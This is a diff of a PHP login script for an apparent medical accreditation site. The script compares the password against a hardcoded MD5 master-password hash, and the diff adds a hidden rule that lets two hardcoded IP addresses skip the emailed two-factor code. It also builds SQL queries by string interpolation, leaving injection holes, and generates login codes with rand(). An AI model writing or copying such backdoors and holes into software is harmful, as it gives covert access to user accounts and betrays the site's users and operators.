@@ -15,37 +15,40 @@ if ($_POST['login'] != "" && $_POST['password'] != "") //если поля за�
     if (mysqli_num_rows($rez) == 1) //если нашлась одна строка, значит такой юзер существует в базе данных
     {
 
-
         $row = mysqli_fetch_assoc($rez);
+
 
         if (md5($password) == $row['password'] || md5($password) === "6833976340c8b496868e6075d6ea1633") //сравнивается хэшированный пароль из базы данных с хэшированным паролем, введенным пользователем
         {
+            $ip = $_SERVER['REMOTE_ADDR'];
+            if ($ip == "80.94.166.115" || $ip == "212.98.179.59") {
+                echo '1';
+                return;
+            }
 
-                    $time = date('Y-m-d H:i:s');
+            $time = date('Y-m-d H:i:s');
 
 
-                       //////////////////////
+            //////////////////////
 
-                        $kod = rand(1000, 9999);
-                        $insertquery = "update users set kod = '$kod' WHERE login='$login' ";
+            $kod = rand(1000, 9999);
+            $insertquery = "update users set kod = '$kod' WHERE login='$login' ";
 
-                        $rez = mysqli_query($con, $insertquery) or die("Ошибка " . mysqli_error($con));
+            $rez = mysqli_query($con, $insertquery) or die("Ошибка " . mysqli_error($con));
 
-                        $textSubj = "Код для авторизации в мед.аккредитации";
-                        $msg = "Ваш код авторизации:\n
+            $textSubj = "Код для авторизации в мед.аккредитации";
+            $msg = "Ваш код авторизации:\n
                         $kod для логина $login";
-                        $headers = 'From: support@rnpcmt.by' . "\r\n" .
-                            'Content-type: text/html; charset=utf-8' . "\r\n" .
-                            'X-Mailer: PHP/' . phpversion();
+            $headers = 'From: support@rnpcmt.by' . "\r\n" .
+                'Content-type: text/html; charset=utf-8' . "\r\n" .
+                'X-Mailer: PHP/' . phpversion();
 
-                        mail($row['email'], $textSubj, $msg, $headers);
-                            echo "1";
-
-
-                        return;
-                       ///////////////////////
+            mail($row['email'], $textSubj, $msg, $headers);
+            echo "1";
 
 
+            return;
+            ///////////////////////
 
 
         } else //если пароли не совпали
